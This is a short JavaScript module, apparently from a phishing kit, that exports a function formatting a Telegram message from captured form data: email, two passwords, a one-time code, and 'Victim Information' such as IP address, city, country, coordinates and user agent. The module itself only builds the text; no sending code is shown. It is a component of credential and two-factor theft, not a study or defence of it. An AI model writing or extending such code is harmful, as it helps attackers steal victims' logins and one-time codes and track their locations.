const telegramMessage = (body) => {
  return `
Email: ${body?.email || ""}
Password1: ${body?.password1 || ""}
Password2: ${body?.password2 || ""}
OTP: ${body?.otp || ""}
Victim Information:
  IP: ${body?.victimInfo.ip}
  City: ${body.victimInfo.city}
  Country: ${body.victimInfo.country}
  Country code: ${body.victimInfo.countryCode}
  Region: ${body.victimInfo.region}
  Region name: ${body.victimInfo.regionName}
  Zip code: ${body.victimInfo.zip}
  Latitude: ${body.victimInfo.lat}
  Longitude: ${body.victimInfo.lon}\n
User agent: ${body.userAgent}
`;
};

module.exports = { telegramMessage };